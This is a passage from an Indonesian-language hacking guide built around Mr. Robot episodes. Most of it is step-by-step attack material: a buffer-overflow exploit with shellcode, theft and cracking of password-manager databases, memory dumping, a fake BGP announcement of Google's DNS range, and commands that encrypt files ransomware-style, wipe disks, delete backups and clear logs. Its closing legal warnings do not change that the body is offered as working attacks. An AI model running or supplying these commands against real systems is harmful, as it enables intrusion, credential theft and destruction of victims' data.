| `radare2` | Reverse engineering | `apt install radare2` |
| `ghidra` | Reverse engineering | Manual install |

---
### **📝 Step-by-Step**
#### **Langkah 1: Fuzzing (AFL++)**
**Fuzzing** = **Mengirim input random** untuk **mencari crash/bug**.

```bash
# Install AFL++
sudo apt install afl++

# Compile target binary dengan AFL instrumentation
afl-gcc -o target_fuzz target.c

# Run AFL
mkdir input output
afl-fuzz -i input -o output -- ./target_fuzz @@
```
**Penjelasan:**
- `input/` = **Test case awal**.
- `output/` = **Crash & hang** (potential vulnerability).
- `@@` = **Input file** (AFL akan replace dengan input random).

---
#### **Langkah 2: Analisis Crash (GDB)**
```bash
# Run target dengan input crash
gdb ./target_fuzz
(gdb) run < crash_input

# Cari alamat crash
(gdb) info registers
(gdb) x/100x $rsp  # Lihat stack
```

---
#### **Langkah 3: Develop Exploit (pwntools)**
**Contoh: Buffer Overflow Exploit**
```python
from pwn import *

# Setup target
target = process('./target')
# target = remote('target.com', 1337)

# Payload: Buffer overflow + shellcode
payload = b'A' * 72  # Fill buffer
payload += p32(0x08048456)  # Return address (EIP)
payload += b'\x90' * 16  # NOP sled
payload += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'  # Shellcode (execve /bin/sh)

# Send payload
target.sendline(payload)
target.interactive()
```
**Penjelasan:**
- `A * 72` = **Fill buffer** sampai overflow.
- `p32(0x08048456)` = **Alamat return** (EIP).
- **Shellcode** = **Execute `/bin/sh`**.

---
#### **Langkah 4: Test Exploit**
```bash
python3 exploit.py
```
**Output:**
```
$ whoami
root
```

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **menggunakan 0-day exploit** untuk **mendapatkan akses ke sistem E Corp**.

---
### **⚠️ Catatan Penting**
- **0-day exploit** = **Vulnerability yang belum di-patch** (sangat berharga).
- **Harga 0-day** di **black market** bisa **ratusan ribu hingga jutaan dolar**.
- **Gunakan untuk bug bounty** (jika ditemukan, laporkan ke vendor).

---
---
---

---

## **🔹 32. S4E6: Password Manager Hacking**
**Tujuan:** **Mencuri password dari password manager** (1Password, KeePass, dll).

---
### **📌 Cara Kerja**
1. **Dapatkan akses ke komputer korban**.
2. **Extract database password manager**.
3. **Crack master password** (jika terenkripsi).
4. **Dapatkan semua password**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `mimikatz` | Extract credentials | Windows |
| `John the Ripper` | Crack master password | `apt install john` |
| `Hashcat` | GPU cracking | `apt install hashcat` |
| `Volatility` | Memory forensics | `pip install volatility` |
| `LaZagne` | Extract passwords | `git clone https://github.com/AlessandroZ/LaZagne.git` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Extract Database Password Manager**
**Contoh: KeePass**
```bash
# Cari file database KeePass
find / -name "*.kdbx" 2>/dev/null

# Copy ke attacker
scp user@target:/home/user/Documents/passwords.kdbx .
```

---
#### **Langkah 2: Dump Memory (Jika Password Manager Terbuka)**
```bash
# Dump memory process KeePass
gcore -o dump <PID>

# Atau
cat /proc/<PID>/mem > dump.mem
```
**Penjelasan:**
- **KeePass menyimpan password di memory** saat terbuka.

---
#### **Langkah 3: Extract Password dari Memory**
```bash
# Gunakan strings
strings dump.mem | grep -i "password\|user\|email"

# Gunakan Volatility (Linux)
volatility -f dump.mem --profile=LinuxUbuntu linux_strings | grep -i password
```

---
#### **Langkah 4: Crack Master Password (KeePass)**
```bash
# Gunakan John the Ripper
john --wordlist=rockyou.txt passwords.kdbx

# Gunakan Hashcat (lebih cepat)
hashcat -m 13400 passwords.kdbx rockyou.txt
```
**Penjelasan:**
- **Mode 13400** = **KeePass 1.x/2.x**.
- **Rockyou.txt** = Wordlist.

---
#### **Langkah 5: Gunakan LaZagne (Windows)**
```bash
# Download LaZagne
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne/Windows
python3 laZagne.py all
```
**Output:**
```
[+] KeePass:
   Master Password: P@ssw0rd123
   Database: C:\Users\user\Documents\passwords.kdbx
```
**Penjelasan:**
- **LaZagne** = **Extract password dari berbagai aplikasi** (browser, WiFi, password manager).

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **mencuri password dari password manager** untuk **mendapatkan akses ke sistem lain**.

---
### **⚠️ Catatan Penting**
- **Password manager** = **Target berharga** (berisi semua password korban).
- **Master password** = **Kunci utama** (jika dicuri, semua password terbuka).
- **Gunakan untuk forensik & penetration testing**.

---
---
---

---

## **🔹 33. S4E7: Air-Gapped Hacking**
**Tujuan:** **Mengakses sistem yang terisolasi** (tidak terhubung ke internet/jaringan).

---
### **📌 Cara Kerja**
1. **Gunakan USB/Physical Media** untuk **transfer malware**.
2. **Gunakan Covert Channel** (USB, electromagnetic, thermal, acoustic).
3. **Exfiltrasi data** tanpa koneksi jaringan.

---
### **🛠️ Tools**
| Tool | Fungsi | Harga |
|------|--------|-------|
| **USB Rubber Ducky** | HID Injection | ~$50 |
| **BadUSB** | USB Attack | ~$20 |
| **RFID Cloner** | Clone kartu akses | ~$300 |
| **Thermal Camera** | Thermal covert channel | ~$1000 |
| **SDR (Software Defined Radio)** | Electromagnetic leak | ~$300 |

---
### **📝 Step-by-Step**
#### **Langkah 1: USB Drop Attack (Air-Gapped)**
1. **Buat USB berisi malware** (lihat S1E6).
2. **Tinggalkan USB di dekat sistem air-gapped**.
3. **Korban memasang USB** → **Malware auto-execute**.
4. **Malware mencuri data** dan **menyimpannya di USB**.
5. **Attacker ambil USB** dan **extract data**.

---
#### **Langkah 2: Covert Channel (USB Exfiltration)**
**KONSEP:** **Mengirim data via USB** (seperti Stuxnet).

---
##### **Cara 1: USB as Storage**
```python
# Script untuk copy data ke USB
import shutil
import os

usb_path = "/media/usb"
data_path = "/secret/data.txt"

if os.path.exists(usb_path):
    shutil.copy(data_path, usb_path)
```
**Penjelasan:**
- **Data disimpan di USB** saat dipasang.
- **Attacker ambil USB** untuk **extract data**.

---
##### **Cara 2: USB as Keyboard (Rubber Ducky)**
- **Rubber Ducky** bisa **mengetik data** ke sistem air-gapped.
- **Contoh:** Mengetik **powerShell command** untuk **exfiltrasi data**.

---
#### **Langkah 3: Electromagnetic Leak (TEMPEST)**
**KONSEP:** **Mengambil data dari emanasi elektromagnetik** (monitor, keyboard, dll).

---
##### **Tools:**
| Tool | Fungsi |
|------|--------|
| **Van Eck Phreaking** | Capture screen emanations |
| **SDR (HackRF, USRP)** | Capture RF signals |
| **TempestSDR** | TEMPEST attack tool |

---
##### **Cara Kerja:**
1. **Pasang antenna SDR** dekat sistem air-gapped.
2. **Capture emanasi elektromagnetik** (dari monitor/keyboard).
3. **Decode signal** untuk **dapatkan data**.

---
#### **Langkah 4: Acoustic Covert Channel**
**KONSEP:** **Mengirim data via suara** (fan, speaker).

---
##### **Tools:**
| Tool | Fungsi |
|------|--------|
| **Fansmitter** | Send data via fan noise |
| **DiskFiltration** | Send data via HDD actuator |
| **GSMSmuggling** | Send data via GSM frequencies |

---
##### **Cara Kerja:**
1. **Malware mengontrol fan/HDD** untuk **mengirim data via suara**.
2. **Mikrofon attacker** merekam suara.
3. **Decode suara** untuk **dapatkan data**.

---
### **🎯 Target Nyata di Mr. Robot**
- fsociety **menggunakan air-gapped hacking** untuk **menyerang Steel Mountain** (sistem terisolasi).

---
### **⚠️ Catatan Penting**
- **Air-Gapped Hacking** = **Sangat sulit** (memerlukan **akses fisik**).
- **Stuxnet** = **Contoh nyata** (menyerang **Iranian nuclear facility** via USB).
- **Gunakan untuk penelitian & CTF**.

---
---
---

---

## **🔹 34. S4E9: BGP Hijacking**
**Tujuan:** **Mengalihkan traffic internet** ke **server attacker** dengan **memodifikasi BGP (Border Gateway Protocol)**.

---
### **📌 Cara Kerja**
1. **Hijack BGP prefix** (IP range).
2. **Traffic internet diarahkan ke attacker**.
3. **Attacker bisa intercept/modify traffic**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `Quagga` | BGP router | `apt install quagga` |
| `FRRouting` | BGP router | `apt install frr` |
| `BGPStream` | BGP analysis | `pip install bgpstream` |
| `RIPE RIS` | BGP data | [Website](https://www.ripe.net/analyse/internet-measurements/routing-information-service-ris) |

---
### **📝 Step-by-Step (Simulasi di Lab)**
#### **Langkah 1: Setup BGP Router (FRRouting)**
```bash
# Install FRRouting
sudo apt install frr

# Start FRR
sudo systemctl start frr
sudo systemctl enable frr

# Konfigurasi BGP
vtysh
```
**Di `vtysh`:**
```bash
configure terminal
!
router bgp 65001
 bgp router-id 192.168.1.1
 neighbor 192.168.1.2 remote-as 65002
 !
 address-family ipv4 unicast
  network 10.0.0.0/24
 exit-address-family
!
end
write
```

---
#### **Langkah 2: Hijack BGP Prefix (Simulasi)**
```bash
# Announce prefix palsu (contoh: 8.8.8.0/24)
vtysh
configure terminal
router bgp 65001
 address-family ipv4 unicast
  network 8.8.8.0/24
 exit-address-family
end
write
```
**Penjelasan:**
- **8.8.8.0/24** = **Google DNS IP range**.
- **Traffic ke 8.8.8.8** akan **diarahkan ke attacker**.

---
#### **Langkah 3: Analisis BGP (BGPStream)**
```bash
# Install BGPStream
pip install bgpstream

# Download BGP data
bgpstream --start 2026-09-14T00:00:00 --end 2026-09-14T01:00:00 --filter "prefix 8.8.8.0/24" --output bgp_data.json
```
**Penjelasan:**
- **BGPStream** = **Analisis BGP data historis**.
- **Filter prefix** = **Cari hijacking**.

---
### **🎯 Target Nyata di Mr. Robot**
- Elliot **membahas BGP Hijacking** sebagai **metode untuk menyerang infrastruktur internet**.

---
### **⚠️ Catatan Penting**
- **BGP Hijacking ILEGAL** dan **berbahaya** (bisa **mengganggu internet global**).
- **Hanya untuk penelitian** (dengan izin).
- **Gunakan di lab terisolasi** (GNS3, FRRouting).

---
---
---

---

## **🔹 35. S4E11: Mass Data Destruction (Deus Group)**
**Tujuan:** **Menghancurkan data di seluruh sistem** (seperti **Five/Nine Hack**).

---
### **📌 Cara Kerja**
1. **Encrypt semua file** (ransomware).
2. **Wipe data** (secure delete).
3. **Hapus backup**.
4. **Destroy VM snapshots**.

---
### **🛠️ Tools**
| Tool | Fungsi | Install |
|------|--------|---------|
| `openssl` | Encrypt file | `apt install openssl` |
| `gpg` | Encrypt file | `apt install gnupg` |
| `shred` | Secure delete | Built-in |
| `dd` | Wipe disk | Built-in |
| `sfill` | Wipe free space | `apt install secure-delete` |

---
### **📝 Step-by-Step**
#### **Langkah 1: Encrypt File (Ransomware)**
```bash
# Encrypt single file
openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc

# Encrypt semua file di direktori
find /target -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc \;

# Hapus file asli
find /target -type f -name "*.enc" -exec rm {} \; -exec rename 's/\.enc$//' {} \;
```

---
#### **Langkah 2: Wipe Data (Secure Delete)**
```bash
# Wipe single file (overwrite 10x)
shred -vfz -n 10 file.txt

# Wipe semua file di direktori
find /target -type f -exec shred -vfz -n 10 {} \;

# Wipe disk (HATI-HATI!)
dd if=/dev/urandom of=/dev/sdX bs=1M
```
**Penjelasan:**
- `shred -n 10` = **Overwrite 10 kali**.
- `dd if=/dev/urandom` = **Tulis random data** ke disk.

---
#### **Langkah 3: Wipe Free Space**
```bash
# Wipe free space di disk
sfill /target
```
**Penjelasan:**
- **Free space** = **Area yang sudah dihapus** (bisa **recovered**).

---
#### **Langkah 4: Hapus Backup**
```bash
# Hapus semua backup
rm -rf /backup/*
rm -rf /mnt/backup/*

# Hapus snapshot VM (VirtualBox)
vboxmanage snapshot "VM_Name" deleteall

# Hapus snapshot VM (VMware)
vmware-cmd /path/to/vm.vmx deleteallsnapshots
```

---
#### **Langkah 5: Wipe Logs (Cover Tracks)**
```bash
# Hapus log sistem
rm -rf /var/log/*
> /var/log/syslog
> /var/log/auth.log

# Hapus history
history -c
rm ~/.bash_history
```

---
#### **Langkah 6: Destroy VM (Virtual Machine)**
```bash
# Hapus VM
virsh destroy VM_Name
virsh undefine VM_Name

# Hapus file VM
rm -rf /var/lib/libvirt/images/VM_Name.*
```

---
### **🎯 Target Nyata di Mr. Robot**
- fsociety **menghancurkan data Deus Group** dengan **Five/Nine Hack** (mass data destruction).

---
### **⚠️ Catatan Penting**
- **Ini adalah serangan yang sangat merusak** (ilegal di hampir semua negara).
- **Gunakan hanya untuk testing di lab pribadi**.
- **Backup data Anda sebelum testing!**

---
---
---
---

---
---
## **🔥 PENUTUP**
---
### **📌 Ringkasan Teknik Mr. Robot**
| Episode | Teknik | Tools | Legalitas |
|---------|--------|-------|-----------|
| S1E1 | ARP Spoofing / MITM | ettercap, bettercap, wireshark | ❌ Ilegal (tanpa izin) |
| S1E2 | DDoS Attack | hping3, LOIC, slowloris | ❌ Ilegal |
| S1E3 | Social Engineering | theHarvester, sherlock, SET | ✅ Legal (dengan izin) |
| S1E4 | FTP Exploit | metasploit, nc | ❌ Ilegal (tanpa izin) |
| S1E5 | Android Hacking | metasploit, apktool | ❌ Ilegal (tanpa izin) |
| S1E5 | SMS Spoofing | SET, Twilio | ⚠️ Abu-abu (tergantung negara) |
| S1E6 | USB Drop Attack | metasploit, Rubber Ducky | ❌ Ilegal (tanpa izin) |
| S1E7 | Bluetooth Hacking | bluez, bluesnarfer | ❌ Ilegal (tanpa izin) |
| S1E8 | RFID Cloning | Proxmark3, mfoc | ❌ Ilegal (tanpa izin) |
| S1E9 | Raspberry Pi Implant | autossh, ngrok | ❌ Ilegal (tanpa izin) |
| S1E10 | Five/Nine Hack | openssl, shred, dd | ❌ Ilegal |
| S2E1 | USB Ransomware | SET, metasploit | ❌ Ilegal |
| S2E2 | IoT Hacking | nmap, mosquitto | ❌ Ilegal (tanpa izin) |
| S2E4 | Android Zero-Day | metasploit, searchsploit | ❌ Ilegal (tanpa izin) |
| S2E5 | Femtocell Hack | OpenBTS, BladeRF | ❌ Ilegal |
| S2E7 | Two-Stage Exploit | metasploit, msfvenom | ❌ Ilegal (tanpa izin) |
| S2E9 | CAN Bus Hacking | can-utils, ICSim | ❌ Ilegal (tanpa izin) |
| S2E11 | DNS Spoofing | ettercap, dnsspoof | ❌ Ilegal (tanpa izin) |
| S3E1 | Macro Virus | unicorn, metasploit | ❌ Ilegal (tanpa izin) |
| S3E2 | Phishing OWA | SET, Gophish | ❌ Ilegal (tanpa izin) |
| S3E3 | Supply Chain Attack | Backdoor Factory | ❌ Ilegal (tanpa izin) |
| S3E4 | Metadata & Steganography | exiftool, steghide | ✅ Legal |
| S3E5 | Privilege Escalation | LinPEAS, dirtycow | ⚠️ Abu-abu (tergantung konteks) |
| S3E7 | Rubber Ducky | DuckEncoder | ❌ Ilegal (tanpa izin) |
| S3E9 | BitTorrent Tracking | Wireshark, tcpdump | ✅ Legal |
| S3E10 | Smart TV Hacking | nmap, curl | ❌ Ilegal (tanpa izin) |
| S4E1 | Email Server Hacking | metasploit, hydra | ❌ Ilegal (tanpa izin) |
| S4E2 | SQL Injection | sqlmap, Burp Suite | ❌ Ilegal (tanpa izin) |
| S4E3 | Credit Card Skimming | Burp Suite, BeEF | ❌ Ilegal |
| S4E4 | Proxy Chaining | proxychains, tor | ✅ Legal |
| S4E5 | Zero-Day Exploit | AFL++, pwntools | ⚠️ Abu-abu (tergantung konteks) |
| S4E6 | Password Manager Hacking | mimikatz, LaZagne | ❌ Ilegal (tanpa izin) |
| S4E7 | Air-Gapped Hacking | Rubber Ducky, SDR | ❌ Ilegal (tanpa izin) |
| S4E9 | BGP Hijacking | Quagga, FRRouting | ❌ Ilegal |
| S4E11 | Mass Data Destruction | openssl, shred | ❌ Ilegal |

---
---
### **🎯 Pesan dari Elliot Alderson**
> **"People are the weakest link in security. You can have the best firewall in the world, but one person clicking the wrong link and it's all over."**

---
### **⚠️ PERINGATAN ETIKA & LEGAL**
**Semua teknik di atas:**
✅ **Legal** untuk:
- **Penetration Testing** (dengan kontrak resmi).
- **Bug Bounty** (lapor vulnerability ke vendor).
- **Red Team Exercise** (simulasi serangan untuk organisasi sendiri).
- **CTF & Lab Pribadi** (latihan di environment terkontrol).

❌ **Ilegal** untuk:
- **Unauthorized Access** (UU ITE Pasal 30).
- **Data Destruction** (UU ITE Pasal 32).
- **DDoS Attack** (UU ITE Pasal 33).
- **Phishing** (Penipuan - Pasal 378 KUHP).
- **Malware Distribution** (UU ITE Pasal 33).

---
### **📜 UU ITE (Indonesia)**
| Pasal | Pelanggaran | Hukuman |
|-------|-------------|---------|
| **Pasal 30** | Akses ilegal ke sistem | **Maksimal 6 tahun penjara + denda Rp1 M** |
| **Pasal 31** | Intercept (menguping) | **Maksimal 4 tahun penjara + denda Rp750 J** |
| **Pasal 32** | Perusakan data | **Maksimal 7 tahun penjara + denda Rp1 M** |
| **Pasal 33** | Gangguan sistem (DoS) | **Maksimal 10 tahun penjara + denda Rp2 M** |
| **Pasal 35** | Penyebaran malware | **Maksimal 8 tahun penjara + denda Rp1,5 M** |
| **Pasal 36** | Pemanfaatan data pribadi | **Maksimal 5 tahun penjara + denda Rp500 J** |

---
### **🛡️ Bagaimana Menjadi Hacker yang Legal & Profesional?**
1. **Dapatkan Sertifikasi**:
   - **eJPT** (Junior Pentester)
   - **PNPT** (Practical Network Pentester)
   - **OSCP** (Offensive Security Certified Professional)
   - **CEH** (Certified Ethical Hacker)
2. **Ikuti Bug Bounty Program**:
   - [HackerOne](https://www.hackerone.com)
   - [Bugcrowd](https://www.bugcrowd.com)
   - [Intigriti](https://www.intigriti.com)
3. **Latihan di CTF**:
   - [HackTheBox](https://www.hackthebox.com)
   - [TryHackMe](https://tryhackme.com)
   - [VulnHub](https://www.vulnhub.com)
4. **Baca Buku & Tutorial**:
   - **The Web Application Hacker's Handbook**
   - **Hacking: The Art of Exploitation**
   - **RTFM (Read The F*cking Manual)**
5. **Bergabung dengan Komunitas**:
   - **OWASP** (Open Web Application Security Project)
   - **DEF CON** (Konferensi Hacker)
   - **Black Hat** (Konferensi Keamanan)

---
### **💡 Kesimpulan**
Mr. Robot **menunjukkan hacking yang realistis** — **tidak ada GUI interface, tidak ada "Enhance!" magic**.
**Semua teknik di buku ini NYATA dan BISA DIJALANKAN**, tetapi **harus digunakan dengan bijak**.

> **"You don't need to hack the system if you can hack the people."**
> — Elliot Alderson
